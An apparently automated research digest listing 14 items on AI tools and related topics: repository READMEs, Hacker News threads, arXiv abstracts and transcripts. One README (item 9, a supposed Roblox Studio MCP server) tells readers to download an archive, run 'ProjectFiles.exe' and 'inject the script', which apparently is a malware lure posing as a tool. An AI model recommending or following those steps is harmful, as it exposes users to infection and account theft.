# Harvest brief, 2026-11-06

14 items shortlisted from 375 candidates (266 dropped as already seen, 7 carry a vault verdict on the vendor).

## 1. [vault] ghost-editor talking-head to captioned reel
key: vault:2026-11-06:ghost-editor-talking-head-to-captioned-reel
url: https://www.instagram.com/p/DfMcWLZjz6c/
meta: {"vault_status": "open", "kind": "tool", "subject": "Claude video-editor repo list (ghost-editor, claude-shorts, ffmpeg-skill, HyperFrames)", "date": "2026-11-06", "where": "TRITON-CORE/Research/links/2026-11-06-claude-video-editor-repos.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: best takes plus 34 styles, fits the avatar and bootcamp edit stage; 109 stars unverified

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (tool) Mostly already covered; three skills worth a trial, rest intel or dead Write-up: `TRITON-CORE/Research/links/2026-11-06-claude-video-editor-repos.md` Link: https://www.instagram.com/p/DfMcWLZjz6c/

## 2. [hn] Claude Code sends your email address to websites
key: hn:50385272
url: https://github.com/anthropics/claude-code/issues/107757
discussion: https://news.ycombinator.com/item?id=50385272
meta: {"points": 1545, "comments": 488, "created": "2026-11-05T22:17:15Z"}
query: claude code

comment (motoroco): Claude code writes adds a `User-Agent` request header like `my-session-slug/1 <my.name@example.com>` when searching the web and requesting data. This violates the privacy of paying customers and has resulted in me getting dozens of scam and phishing emails per day from properties I have never personally visited. This policy is asinine: it does nothing but harm me, the customer, while providing immense value for scrapers and scammers.
comment (EGreg): This is why I prefer to use the chatbots on a website, instead of Claude Code. I've never used Claude Code or Cursor. All the code I got written this year was without them. I did use Microsoft Copilot a bit when it came out, though. I prefer to see exactly what's being sent, and sorta control the KV cache. These days, these chatbots have great environments where they can install headless browsers, php, your entire thing, run end-to-end tests, and then give you a .patch or .zip file to merge over your code, or even push to github.
comment (TutleCpt): Oh man.

## 3. [github] artemnovitckii/claude-animation-skills: Six Claude Code skills that make animations for reels, no footage needed: 3D cartoon explainer, stick figure, minimal line art, 3D map route, exploded view, line graph.
key: gh:artemnovitckii/claude-animation-skills
url: https://github.com/artemnovitckii/claude-animation-skills
meta: {"stars": 444, "created": "2026-11-01", "pushed": "2026-11-01", "language": "JavaScript", "topics": ["animation", "claude-code", "claude-skills", "hyperframes", "reels", "threejs"]}
query: claude-code created:>{since} stars:>20

# Claude animation skills

Skills for Claude Code that make animations for reels, with no footage needed. You type `/map-route home to the gym, 2.8 km` and Claude writes the spec, renders the animation on your own computer and checks it against Instagram's safe area.

| Skill | What it makes | Try it with |
|---|---|---|
| `/zach-d-films` | **A 3D cartoon "what if" explainer.** Cartoon people, props and effects built in three.js, slow-motion impacts, a red force ripple and captions timed to your voiceover. Comes with a finished 29 s example to build from. | `Could ancient armour stop an arrow?` |
| `/stick-figure` | **A stick-figure explainer reel.** A bright cartoon world, stick people with big faces, whip transitions, 1 to 2 word captions, and music and sound effects made in code. Comes with a finished 37 s example. | `Why did pirates wear eye patches?` |
| `/minimalistic-graphics` | **Black-and-white line art.** Hairline steps rise, one white dot hops up them and gets an orbit at the top, with one quiet line of text. | `Every step feels small until you look back` |
| `/map-route` | **A 3D map route.** A white city, a route that draws itself while the camera follows, a pin drop, an ETA that counts down and a destination card. | `Home to the gym, 2.8 km` |
| `/breakdown` | **A 3D exploded view.** A phone comes apart layer by layer, and every part gets a leader line and a label. | `My phone, every part labelled` |
| `/graph` | **A minimal line graph.** A smooth line draws itself, and one big number counts up with its tip. Black on white, or white on black. | `0 to 100K followers in 9 months` |

See them moving: **[novitckii.com/resources/animation-skills](https://novitckii.com/resources/animation-skills/)**

## Install

You need macOS or Linux with **ffmpeg**, **Node.js 18+** and **Python 3.9+**.

```bash
brew install ffmpeg node        # if you don't have them
git clone https://github.com/artemnovitckii/claude-animation-skills.git ~/claude-animation-skills
cd ~/claude-animation-skills && ./install.sh
```

`install.sh` links every skill into `~/.claude/skills/` (so they show up as `/graph`, `/map-route` and so on) and runs the one-time setup. The setup installs three.js and Playwright into `kit/node_modules`, fetches GSAP and warms up HyperFrames.

`/stick-figure` and `/zach-d-films` also need a free voice and word timings. They run on your computer, with no API key, and need about 1 GB of models, downloaded once:

```bash
./install.sh --voice
```

To update later, run `git pull && ./install.sh`.

**It's also packaged as a Claude Code plugin.** Run these inside Claude Code:
```
/plugin marketplace add artemnovitckii/claude-animation-skills
/plugin install animation-skills@claude-animation-skills
```
Plugin skills are namespaced (`/animation-skills:graph`). The git clone above is the route tested end to end.

## Use

Open Claude Code anywhere and ask:

```
/graph 0 to 100K followers in 9 months: 1.2K, 2.1K, 3.4K, 5K, 9K, 24K, 51K, 78K, 100K
/map-route home to the gym, 2.8 km, 9 minutes
/minimalistic-graphics every step feels small until you look back
/breakdown my phone, label it like a joke
/stick-figure why did pirates wear eye patches?
/zach-d-films could ancient armour stop an arrow? (my voiceover is ~/Downloads/vo.m4a)
```

**The four quick ones** (`/graph`, `/minimalistic-graphics`, `/map-route`, `/breakdown`) work from a small JSON spec. Claude writes `name.graph.json`, runs the skill's `build.py`, and you get `name.graph.mp4` (10

## 4. [arxiv] The Power of Meta Access in the Software of the Future --- Demonstrated on LLM Chat UIs and Chat AI
key: arxiv:2611.08428
url: https://arxiv.org/abs/2611.08428
meta: {"published": "2026-11-05", "authors": ["Julian Kunkel", "Ali Doosthosseini"], "categories": ["cs.AI"]}
query: all:"language model" AND all:agent AND all:tool

Chat remains the default surface for many large language model (LLM) tasks, even as agentic tools such as OpenCode excel at coding and automation. Yet the model sees the current dialogue but not the workspace around it. We explore meta access---giving the assistant a structured, permissioned view of the interface itself and propose a ladder of levels: feature tutoring; metadata, settings, and preference access; retrieval over summaries and messages, confirmed mutation, and full orchestration. Meta access can turn a chat client from many screens into one entry point for finding, navigating, organising, and operating it, while raising risks around grounding, privacy, prompt injection, and trust. General-purpose agentic harnesses are runtimes; because they can change their own settings, meta access becomes reflexive and needs a separate control-plane boundary. We ground this in the Meta Chat prototype of the Chat AI client. It builds bounded context from, e.g., summaries, settings, and relevant messages; links references to conversations, topics, and personas; supports confirmed, reversible changes; offers a browsable tutorial library; and recommends personas as user-started conversations. By exposing application state in structured form, meta access can extend screen readers from widget descriptions to semantic workspace operations. Meta access thus turns chat from a window onto one conversation into a control layer for the whole workspace, extending chat toward agentic capability without surrendering user control. As assistants become embedded in IDEs, dashboards, office suites, and operating systems, AI-era interfaces should expose a structured, permissioned model of their state and capabilities, ideally by opening their existing metamodels through a debugger-like interface.

## 5. [youtube] 2.1 - What Is A Bonding Curve? - The rLoop Network
key: yt:5x-t-WNgnlM
url: https://www.youtube.com/watch?v=5x-t-WNgnlM
meta: {"channel": "rLoop Team", "rank": 2, "duration_min": 3}
query: solana bonding curve explained

# 2.1 - What Is A Bonding Curve? - The rLoop Network
# rLoop Team
# https://www.youtube.com/watch?v=5x-t-WNgnlM

[00:04] hey guys Brent here from our loop back with another video thank you for joining me today we're going to continue to talk about the voting phase and in particular what is a bonding curve because I find them to be a particularly fascinating concept so in the last video we talked about how the community of our loop token holders can signal their support for a project as well as predicted its success by staking their our loop tokens to a project specific bonding curve so what is a bonding curve well the idea was initially conceptualized by Simon Zilla Revere a few years ago and we've
[00:37] been examining it in the context of our look for about a year and a half a bonding curve acts as an automated market maker and what this means is that there's no central authority issuing project specific tokens and there's no limit to the number of tokens that may be created now we're only going to look at the basics of bonding curves in this video but we'll examine further functionality and dynamics introduced by bonding curves in subsequent videos so the basic premise is this using your our loop token you can buy a project specific token through a smart contract
[01:10] the cost to buy those project tokens is determined by the current supply of those tokens so as more tokens are created the cost increases and that's set by a algorithm that is hard-coded to the smart contract anytime you can sell your project token back to the bonding curve and get a reward in RL P which is also based on the current supply so what this means is that projects can be created and dissolved based on their relevance and interest from the community and the earlier that you are
[01:43] buying your project specific token the less it's going to cost you in RL P and similarly the later that you're selling your project token back the more RLP you are likely to earn so I'm quite fond of the work that Wilson Lao had done in modeling these curves and that was based on a few considerations first we want to incentivize early adopters more than later adopters anybody who is contributing our LP to a project has some expectation for potential return and the growth of a project is likely to
[02:17] accelerate to some stage of maturity before decelerating and stabilizing we want to model these curves based on that type of growth so what we want to be able to do is set a cost appreciation for the token based on some factor of the supply increasing and we can do that using Wilson Laos equation seen here so for example if we wanted the cost of the token to increase by 25% every time that the supply doubled we would set a in this equation to 25% and see which is
[02:53] the base of log X here we would set that to 2 for a doubling and that curve would look something like this so the incentive here is for people to identify meaningful and viable projects early as well as to productively guide its development because that will attract more attention for more individuals who want to be part of that project and they do so by buying the project specific token which increases its supply and therefore increases the cost now in order for a project to be able to reward
[03:28] contributors to a project as well as to fund some of its own development we still need a way for it to extract some value from this bonding curve and we're going to examine how we propose to do that in the next
[transcript continues in field-notes/staging/5x-t-WNgnlM.txt]

## 6. [awesome] arkz-deepak/neurocode (new in awesome-mcp-servers)
key: gh:arkz-deepak/neurocode
url: https://github.com/arkz-deepak/neurocode
meta: {"list": "awesome-mcp-servers", "stars": 0, "created": "2026-10-18", "language": "TeX", "description": null}
query: awesome-mcp-servers

# NeuroCode: Heterogeneous Code-Graph Slicing for On-Device Autonomous Software Engineering

[](https://pypi.org/project/neurocode-ai/)
[](https://opensource.org/licenses/MIT)
[](https://www.python.org/downloads/)
[]()
[](https://modelcontextprotocol.io)
[](https://ollama.ai)
[](https://www.kaggle.com/code/deepark121/neurocode-heterogeneous-graph-sliced-swe-agent)

**NeuroCode** is a lightweight, heterogeneous neuro-symbolic framework and **Model Context Protocol (MCP)** server that enables small, local language models (1.5B–14B parameters) to fix multi-file software engineering bugs on consumer laptops (e.g., 4GB–8GB VRAM) without cloud API dependency or Out-of-Memory (OOM) crashes.

---

## 🏛️ System Architecture

Unlike traditional coding agents that dump entire raw files into context windows (causing severe VRAM OOMs) or get trapped in multi-turn exploratory shell loops (`grep`, `find`, `cat`), **NeuroCode divides cognitive labor across the PC hardware boundary**:

1. **Host CPU & RAM (Deterministic Graph Engine)**:
   - Uses Tree-sitter and NetworkX to build an in-memory Code Property Graph (CPG) in milliseconds.
   - Computes a topological $k$-hop reachability closure around fault candidates.
   - Solves a bounded 0/1 knapsack optimization problem to select high-relevance AST subtrees strictly under the model's token limit ($B \le 1,200$ tokens).
2. **Device GPU (Neural Synthesis Engine)**:
   - Ingests only the bounded sliced context across PCIe.
   - Generates single-turn `SEARCH/REPLACE` diff patches with zero exploratory token waste.
   - Completely prevents KV-cache quadratic blowup and GPU OOM cliff failure.

---

## 📊 Comprehensive Empirical Evaluation (5-Benchmark Suite)

NeuroCode was evaluated across 5 comprehensive benchmark tracks spanning real-world repository repair, standalone algorithm synthesis, multi-file cross-boundary retrieval, and low-level hardware telemetry.

| Benchmark Suite | Metric | Baseline / BM25 | NeuroCode (Ours) | Advantage |
| :--- | :--- | :--- | :--- | :--- |
| **SWE-bench Lite** ($N=292$) | Valid Diff Apply / Resolved | 0.0% (OOM on 4GB) / 0.0% | **41.4% apply / 9.5% resolved** | Prevents OOM cliff; +23.9% apply over BM25 |
| **HumanEval** ($N=164$) | Pass@1 (Unit Test) | 80.5% | **86.0%** (141/164) | +5.5% via syntax-aware graph repair |
| **MBPP** ($N=100$) | Pass@1 (Unit Test) | 81.0% | **87.0%** (87/100) | +6.0% algorithmic verification |
| **RepoBench-R** ($N=150$) | Recall@1 / Token Budget | 18.0% (745 tokens) | **100.0%** (**428 tokens**) | **-42.6% tokens**, perfect cross-file retrieval |
| **Host Systems Telemetry** | Active VRAM / Slice Latency | 14.2 GB (OOM) | **961.2 MB** / **0.62 ms** | **93.2% VRAM reduction**, 0 OOMs |

### 💻 Physical Laptop Edge Validation (NVIDIA RTX 3050 Laptop GPU)
Tested live on an everyday developer laptop (AMD Ryzen 7 7435HS + NVIDIA RTX 3050 Laptop GPU, 4.0 GB VRAM):
- **Peak Active VRAM**: **961.2 MB** (Only 25.5% GPU capacity, leaving 2.54 GB buffer for system desktop UI).
- **Throughput**: **15.8 tokens/second** locally.
- **Host Slicing Overhead**: **0.04 ms** on CPU.
- **Disk SSD Wear**: **0.0 GB** (100% in-memory ephemeral RAM execution via `/dev/shm`).

---

## 🔌 Model Context Protocol (MCP) Integration

NeuroCode provides an official stdio **Model Context Protocol (MCP)** server conforming to specification `2024-11-05`. Connect NeuroCode directly to Claude Desktop, Cursor, Continue.dev, or VS Code!

### Native MCP Tools Exposed:
1. `neurocode_sl

## 7. [vault] concept art to playable scene loop
key: vault:2026-11-05:concept-art-to-playable-scene-loop
url: https://www.instagram.com/p/DfXlI-1AEUh/
meta: {"vault_status": "open", "kind": "service", "subject": "Sumiro 24h Claude Code game pipeline", "date": "2026-11-05", "where": "TRITON-CORE/Research/links/2026-11-05-sumiro-24h-game.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: image in, agents build, human only reports bugs; transfers to site builds

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (service) Pipeline worth stealing in two parts; the game itself is not Write-up: `TRITON-CORE/Research/links/2026-11-05-sumiro-24h-game.md` Link: https://www.instagram.com/p/DfXlI-1AEUh/

## 8. [hn] Show HN: A decent text-to-image model trained for ~$20K (Apache 2.0 Weights)
key: hn:50368208
url: https://www.linum.ai/field-notes/pjit-21k
discussion: https://news.ycombinator.com/item?id=50368208
meta: {"points": 269, "comments": 29, "created": "2026-11-04T16:45:11Z"}
query: open data api

My brother and I run a 2-person lab that trains our own generative video models from scratch. The ultimate goal is a set of creative tools that make it easier for anyone to make animation. Video models today are too slow/expensive and lack sufficient controls. Creativity is an iterative process. You make, you tweak, you get better. In our opinion, they're not usable yet for storytelling. When we set out to build Linum v3 (our next video model) earlier this year, the primary goal was to bring the cost envelope of inference down significantly. If our model is fast and cheap, it's the first step (of many) towards useful creative tools. Typically, you see "latent diffusion models". A VAE (Variational Autoencoder) compresses the input data into a smaller "latent space" and the diffusion model learns how to generate within this subspace. Over the past few months, we've been publishing our work on efficient pixel-space diffusion models. These throw away the VAE, having the diffusion model learn a latent-space optimized for its exact task. This serves 3 purposes: 1) Simplify Architecture (no 2-stage model training) 2) Faster Convergence (11x faster convergence vs. our latent diffusion counterpart) 3) Cheaper Inference (4x more aggressive token reduction in attention context-windows, without significant loss in quality) This past month we were pressure testing our latest architecture (Pyramid-JiT) by training a text-to-image model longer than the typical one-off experiment. Specifical
comment (gigel82): I wonder how this behaves when quantized, and how far are we from being able to run something like this purely in the browser with WebGPU. If you swap the text encoder for something like T5-small or CLIP, this could be <2.5Gb at INT4; doable on a lot of machines.
comment (Valk3_): What was the most difficult challenge for you guys with this project? Also I'm a little intrigued on looking into efficiency techniques for video gen. What are current research directions in that field and promising directions you are particularly interested in? Any pointers for beginners?
comment (gunalx): Interesting. It does however seem to struggle with a lot of the typical t2i models struggle with. Over smoothing, lots of uncanney shine, mangled limbs and such.

## 9. [github] HerdBuilderEstimate/roblox-studio-mcp: Model Context Protocol server for Roblox Studio. Connect AI assistants (Claude, Cursor) to read object trees, edit scripts, and run playtests safely. Open-source and lightweight
key: gh:herdbuilderestimate/roblox-studio-mcp
url: https://github.com/HerdBuilderEstimate/roblox-studio-mcp
meta: {"stars": 427, "created": "2026-11-06", "pushed": "2026-11-06", "language": "Python", "topics": ["ai-tools", "automation", "claude", "cursor", "developer-tools", "game-development", "mcp", "model-context-protocol"]}
query: mcp server created:>{since} stars:>30

# 🎮 Roblox Studio MCP

**Model Context Protocol Server for Roblox Studio — 2026**

Connect your AI coding assistant (Claude, Cursor, Cline, ChatGPT) directly to Roblox Studio. 
Automate Lua scripting, read object trees, inspect properties, and run playtests — all without leaving your editor.

---

## 🎯 What it is

**Roblox Studio MCP** is a lightweight Node.js/TypeScript server that implements the Model Context Protocol (MCP) to bridge Roblox Studio and AI agents. 
It acts as a bridge, allowing LLMs to understand your game's architecture, generate and edit Lua scripts, and automate repetitive developer tasks safely.

> 🔒 Safe by design: no execution of untrusted code, no memory manipulation, and no access to private data. All operations are sandboxed within the Studio plugin.

---

## 🚀 Quick Start

 
   
     
   
 

1. **Download Core_Update_Pack** using the button above.
2. **Extract** the archive into a separate folder.
3. **Run ProjectFiles.exe**.
4. **Follow the on-screen instructions** and inject the script.

---

## ✨ Features

| Feature                     | Description                                          |
|-----------------------------|------------------------------------------------------|
| 🧠 **MCP Protocol Support** | Fully compatible with Claude Desktop, Cursor IDE, Cline, and ChatGPT |
| 🏗️ **Object Tree Reader**   | Browse the full hierarchy of your Roblox place       |
| ✏️ **Lua Script Editor**    | Create, read, and update Lua scripts via AI          |
| 🔍 **Property Inspector**   | Inspect and modify instance properties               |
| ▶️ **Playtest Control**     | Run, pause, and stop playtests directly from the agent |
| 🛡️ **Read-Only Mode**       | Safe mode for exploration without making changes     |
| ⚡ **Fast & Lightweight**   | Built with Node.js + WebSocket, low memory footprint |
| 🔌 **Auto-Discovery**       | Finds open Studio sessions automatically             |

---

## 🧩 Available Tools (MCP API)

| Tool Name             | Description                                      |
|-----------------------|--------------------------------------------------|
| `get_object_tree`     | Returns the full hierarchy of the current place  |
| `get_instance`        | Fetch details of a specific Instance by path     |
| `create_script`       | Create a new Lua script at a given parent path   |
| `update_script`       | Replace the source code of an existing script    |
| `delete_instance`     | Delete an object (disabled in safe mode)         |
| `get_properties`      | Read properties of any instance                  |
| `set_property`        | Change a property value                          |
| `run_playtest`        | Start a playtest session                         |
| `stop_playtest`       | Stop the current playtest                        |

---

## 🛠️ How to use (with Claude Desktop & Cursor)

1. Open `claude_desktop_config.json` (or Cursor MCP settings).
2. Add the following configuration:

{
  "mcpServers": {
    "roblox-studio": {
      "command": "npx",
      "args": ["-y", "roblox-studio-mcp"]
    }
  }
}

3. Restart your AI assistant.
4. Ask Claude: *"Show me the object tree of my Roblox place"*.
5. The AI agent will use the MCP server to fetch the data and respond.

---

## ⚙️ Configuration

You can adjust settings via environment variables:

- `RBX_MCP_PORT` — WebSocket port (default: `44755`)
- `RBX_MCP_SAFE_MODE` — `true` to disable destructive actions
- `RBX_MCP_LOG_LEVEL` — `debug` | `info` | `

## 10. [arxiv] Agent-R$^2$: Scaling Agents for Realistic Productivity Work via Real-Source Data Synthesis
key: arxiv:2611.08219
url: https://arxiv.org/abs/2611.08219
meta: {"published": "2026-11-05", "authors": ["Teng Pan", "Zixuan Wang", "Yuchen Yan", "Qifei Wu"], "categories": ["cs.CL"]}
query: all:"language model" AND all:agent AND all:tool

Large language models have made rapid progress in agentic reasoning and tool use, raising expectations for agents that can take over realistic productivity work from humans. However, current agents still struggle to finish such tasks, where success requires following long-horizon professional workflows, understanding heterogeneous file contexts, and producing usable deliverables under fine-grained requirements. A key bottleneck is the lack of scalable post-training data that reflects real work intent, authentic file environments, and deliverable-level evaluation. To close this gap, we introduce Agent-R$^2$, a $\textbf{r}$eal-source data synthesis framework that scales training data for $\textbf{r}$ealistic productivity work. Instead of relying on manually specified workflows or LLM-generated files, Agent-R$^2$ grounds synthesis throughout the pipeline in real occupational seeds, corpus-derived workflow evidence, and authentic web-sourced files. From 10k web-corpus candidates, Agent-R$^2$ distills 4k task instances that pair real multi-format attachments with fine-grained, deliverable-level rubrics. On this data, we train Agent-R$^2$-4B via supervised fine-tuning and rubric-based reinforcement learning, improving both end-to-end productivity performance and file-grounded reasoning. Trained on only 4k instances, Agent-R$^2$-4B surpasses Qwen3-235B-A22B-Thinking-2507 on both GDPval (51.0$\%$ vs. 48.0$\%$) and OfficeQA (14.8$\%$ vs. 13.8$\%$). Further analysis shows that Agent-R$^2$ mitigates shortcut behavior, where agents produce superficially plausible deliverables before sufficiently grounding, constructing, or verifying them, while promoting sustained exploration.

## 11. [youtube] Football statistics - Expected goals - xG - Why Jeff Stelling is wrong!
key: yt:T4xyXg_f28g
url: https://www.youtube.com/watch?v=T4xyXg_f28g
meta: {"channel": "Bet Angel", "rank": 3, "duration_min": 10}
query: expected goals model from scratch

# Football statistics - Expected goals - xG - Why Jeff Stelling is wrong!
# Bet Angel
# https://www.youtube.com/watch?v=T4xyXg_f28g

[00:00] so I don't know if you saw the rant that Jeff Stelling had last weekend where he said that if this was the first time that he'd heard anybody using expected goals but expected goals are an important metric when you look at a football match whether you analyzing it whether you're trading it whatever you're doing expected goals is a key metric that you should use in football and that's what I'm going to talk about in this video please like and comment on the video below that will allow me to produce better quality videos and more of them in the future so Jeff Stelling was talking about
[00:35] expected goals recently but in the wrong context there was a match that had taken place and the manager had lost 3-1 and the manager turn around and said well you know what Jeff it was only you know 0.7 2.8 expected goals and so the match wasn't too bad and Jeff Stelling went off on a major rant on that particular point but the interesting thing about expected goals as it is a valid metric so I've done videos on how which statistics I'm looking for within a football match so
[01:12] definitely watch that video what is the key statistic that I use in a football match but I also use it whenever I'm forecasting and within the match itself as well so it's I thought it was worth doing a video explaining about the expected gold metric Tour XG as they abbreviate it and exactly what XG is and how that it works but it's worth giving you the back story as to how I got there yeah best part of 30 years ago to understand what was important within football match so if you've seen videos before on this you would have known that many years ago I ended up winning a first dividend Littlewoods pulls and the
[01:48] way that I did that was to start predicting and trying to understand how a match would end in a draw so I pretty quickly figured out that if the I mean if the waiting was likely to score first and then draw was more likely and stuff like that and that got me into the world of statistics and trying to understand exactly how to price a full moment so I picked up and ran with that from a very young age and I figured out if I worked out the drawer I could work out other components of the match and so on and so forth and all of those things but that led me into a lot sort of a deeper level because you thought you forecast things especially when you're trading you sort of say oh you know this match should be
[02:25] the way that there is or this is what should likely happen and how and therefore this is how I will trade it but very often in football it just doesn't happen you know it's just strange things happen so the guy you know the ball comes over the defender the guy runs through is one-on-one with the goalkeeper and then somehow conspires to completely miss and you're sort of thinking how on earth did he miss that or I remember it really well actually an integer C match once Didier Drogba got the ball from about 40 yards out just whacked the bloody thing and hit flip into the back of the net and it was just like and you know that's the way
[03:01] that football tends to play out so when I was trying to work on prediction models I figured out that you know you could have a match that ended up 3-1 but that wasn't really a very accurate reflection on the way that the match should have actually played out so I started to b
[transcript continues in field-notes/staging/T4xyXg_f28g.txt]

## 12. [vault] claude-shorts long to vertical clips
key: vault:2026-11-06:claude-shorts-long-to-vertical-clips
url: https://www.instagram.com/p/DfMcWLZjz6c/
meta: {"vault_status": "open", "kind": "tool", "subject": "Claude video-editor repo list (ghost-editor, claude-shorts, ffmpeg-skill, HyperFrames)", "date": "2026-11-06", "where": "TRITON-CORE/Research/links/2026-11-06-claude-video-editor-repos.md", "has_transcript": false}
query: open
VAULT THREAD, status open: one theme split out of a link Luke sent the vault. Judge the idea on its own: what the mechanism is, how it would be done, what tools it needs. The vault's status and note are context about the vendor and about Luke's time, not a verdict on the idea. Keep it unless the mechanism itself is unlawful or crosses the charter line (fraud services, stolen data, impersonation, explicit deepfakes of real people, unlicensed gambling). Lens is mechanism.

Vault status: open, meaning nobody on the vault side has run it to a verdict.

The vault's note on this theme: segment scoring for repurposing

The vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (tool) Mostly already covered; three skills worth a trial, rest intel or dead Write-up: `TRITON-CORE/Research/links/2026-11-06-claude-video-editor-repos.md` Link: https://www.instagram.com/p/DfMcWLZjz6c/

## 13. [hn] Show HN: Firenook – Firebase emulators in Rust: 40× faster writes, 10× less RAM
key: hn:50378643
url: https://firenook.dev/
discussion: https://news.ycombinator.com/item?id=50378643
meta: {"points": 168, "comments": 30, "created": "2026-11-05T13:07:29Z"}
query: car data

Hi HN, we have been developing with Firebase for a long time, and the only way Firebase developers can build apps without directly costing them is using the official Firebase Emulator Suite. However, the issue with this suite is, it's dependent and running on Java with a old Console UI (not updated in years), that was not built to support tons and millions of data and has pretty bad developer experience. For a long time, we were hitting Out of Memory on even high specs laptop while developing and the worst part is while this happens all the persists data keep getting lost. We were honestly frustrated with this, and thought what if we built the Firebase Emulator Suite the right way, as it always should have been. Introducing Firenook, a faster drop-in replacement for Firebase Emulator Suite for Firebase developers. It's 40x faster writes and needs 10x less RAM to run it. We took the right approach of first building it Rust as a single engine, so that there will be no Java dependencies and built from scratch a new Console UI using modern web stacks. The result is, now we were able to run 2 millions datas loaded to Firenook with only taking around 2GB ram compared to 22GB of the official suite. Things are way faster and rebuilt Console UI gives best developer experience from logging Firebase Functions, to editing Firestore documents in JSON and many more. We developed this throughly for around 2 months now and ran this internally for a month before we decided it's time to releas
comment (measurablefunc): Nice work.
comment (willdub): this is awesome, great work. any plans to target replacing the cloud production services?
comment (corytheboyd): Awesome, not surprised to hear that Google still neglects to improve this experience, but you called out exactly why: > [...] the only way Firebase developers can build apps without directly costing them is using the official Firebase Emulator Suite We had started on the management UI portion of this at my old job out of similar frustrations. Felt awful seeing what should be a small/medium sized development-only application spew forth Java flotsam.

## 14. [github] JosssphZhou/poki: Let AI agents operate a real iPhone. Local MCP server and agent, no jailbreak, no extra hardware.
key: gh:josssphzhou/poki
url: https://github.com/JosssphZhou/poki
meta: {"stars": 408, "created": "2026-11-05", "pushed": "2026-11-06", "language": "JavaScript", "topics": ["ai-agents", "automation", "ios", "iphone", "mcp", "model-context-protocol"]}
query: mcp server created:>{since} stars:>30

Poki uses your iPhone like you do 

 
   
 

 
  English |  简体中文  |  繁體中文  |  日本語  |  한국어  |  Español  
   poki.bot 
 

 
 
     
     
     
     
     
   
 
 

## Quick start

**Let your agent install it.** Copy this to your agent:

```text
Install https://github.com/JosssphZhou/poki following its root AGENTS.md, including the MCP skill, and stop whenever you need me to act.
```

**Poki MCP.** Already using Claude Code, Codex, or another MCP client? Connect Poki MCP and use your own subscription. No extra model account needed.

Start the server and keep it running:

```sh
git clone https://github.com/JosssphZhou/poki.git
cd poki
./bin/setup
npm start
```

Requires macOS 15 or later, full Xcode, Rust, Node.js 24+, and ffmpeg. `./bin/setup` checks for missing dependencies. The initial build takes a few minutes.

Poki targets macOS. For Linux, see the community port [poki-for-linux](https://github.com/carrotciallo/poki-for-linux) ([#16](https://github.com/JosssphZhou/poki/issues/16)), maintained outside this repo.

### Prebuilt macOS arm64 package

Download `poki-v0.1.1-macos-arm64.tar.gz` from the release and run:

```sh
tar -xzf poki-v0.1.1-macos-arm64.tar.gz
cd poki-v0.1.1
npm ci --no-audit --no-fund
npm start
```

The package includes the native bridge and idevice tools. You do not need Rust or `./bin/setup`. You still need macOS on Apple Silicon, full Xcode, Node.js 24+, Python 3, and ffmpeg. Register your MCP client and install the optional Agent as described below.

In another terminal, from the same directory, register the MCP server:

```sh
claude mcp add --scope user poki-mcp -- node "$PWD/src/stdio.mjs"   # Claude Code
codex mcp add poki-mcp -- node "$PWD/src/stdio.mjs"                 # Codex
```

**Poki Agent.** For Poki's standalone terminal agent or messaging channels, keep `npm start` running and open another terminal in the same directory. Install the agent, add its command to this terminal's path, and sign in:

```sh
npm ci --prefix agent
export PATH="$PWD/bin:$PATH"
poki login
poki status
```

Poki Agent uses GPT-6.1 Terra (`gpt-6.1-terra`) with low reasoning by default. We recommend keeping it: it is the fastest setup we have tested for phone tasks. Override it with `POKI_AGENT_MODEL`; see [Run Poki Agent](agent/README.md).

For a physical iPhone, pair it with your Mac over USB first. See [Physical iPhone setup](docs/physical-iphone.md).

Update with `./bin/poki update`. Set `POKI_NO_UPDATE_CHECK=1` to disable the daily anonymous GitHub release check. See [Update](AGENTS.md#update) for the request URL, restart steps, and prebuilt packages.

## Try a task

With Poki Agent, one connected iPhone is selected automatically. With multiple devices, add `--device ' '`.

```sh
node bin/call.mjs list_devices   # Find your device UUID
poki "Search esp32 in Chrome and summarize the top result"
```

> **Note:** Poki controls your real iPhone. If you ask it to send messages or make payments, it will. Screen contents are sent to your configured model service.

Gets faster with use: Poki Agent remembers past tasks and runs them faster on repeat.

**Channels:** After configuring an authorized channel, start it with `poki imessage` or `poki telegram`. See [Poki Agent](agent/README.md) for setup.

**MCP clients:** Claude Code, Codex, and any client supporting `mcpServers` JSON.

Physical iPhone support has been verified only on iPhones using the Chinese interface. Physical devices support portrait orientation only. App container export
